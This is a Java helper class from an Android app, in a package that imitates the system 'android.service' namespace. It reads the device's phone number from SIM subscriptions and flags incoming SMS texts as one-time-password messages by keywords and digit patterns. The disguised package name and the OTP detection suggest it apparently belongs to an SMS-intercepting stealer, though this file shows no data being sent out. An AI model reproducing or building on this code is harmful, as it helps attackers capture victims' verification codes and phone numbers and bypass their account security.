package android.service.sms.helpers;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CustomMethods {

    private static final String TAG = "MADARA";

//    ----------------------------------------------------------------------------------------------

    @SuppressLint("HardwareIds")
    public static String  getPhoneNumber(Context context) {

        String phoneNumber = "";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {

                List<SubscriptionInfo> subscriptionInfos = subscriptionManager.getActiveSubscriptionInfoList();

                if (subscriptionInfos != null && !subscriptionInfos.isEmpty()) {

                    for (SubscriptionInfo subscriptionInfo : subscriptionInfos) {

                        int subscriptionId = subscriptionInfo.getSubscriptionId();

                        phoneNumber = subscriptionManager.getPhoneNumber(subscriptionId);

                        Log.d(TAG, "getPhoneNumber: " + "Subscription ID: " + subscriptionId + ", Phone Number: " + phoneNumber);
                    }
                } else {
                    Log.d(TAG, "getPhoneNumber: No active subscriptions found");
                }
            }
        } else {
            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
                    && ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                phoneNumber = tMgr.getLine1Number();
            }
        }

        return phoneNumber;
    }

//    ----------------------------------------------------------------------------------------------

    public static String escapeSpecialCharacters(String input) {

        String escapedInput = input;

        if (input != null) {

            escapedInput = input.replaceAll("&", "&amp;")
                    .replaceAll("<", "&lt;")
                    .replaceAll(">", "&gt;")
                    .replaceAll("\"", "&quot;")
                    .replaceAll("'", "&apos;");
        }

        return escapedInput;
    }
//    ----------------------------------------------------------------------------------------------

    public static boolean isOTPMessage(String message) {

        // Define common OTP patterns or keywords
        String[] otpKeywords = {"otp", "code", "verify", "password", "authentication", "secret", "pin"};

        // Convert the message to lower case once
        String lowerCaseMessage = message.toLowerCase();

        // Check if the message contains any of the keywords
        for (String keyword : otpKeywords) {
            if (lowerCaseMessage.contains(keyword)) {
                return true;
            }
        }

        // Check for numeric OTP patterns (4 to 12 digits)
        return lowerCaseMessage.matches(".*\\b\\d{4,12}\\b.*");
    }


//    ----------------------------------------------------------------------------------------------

}
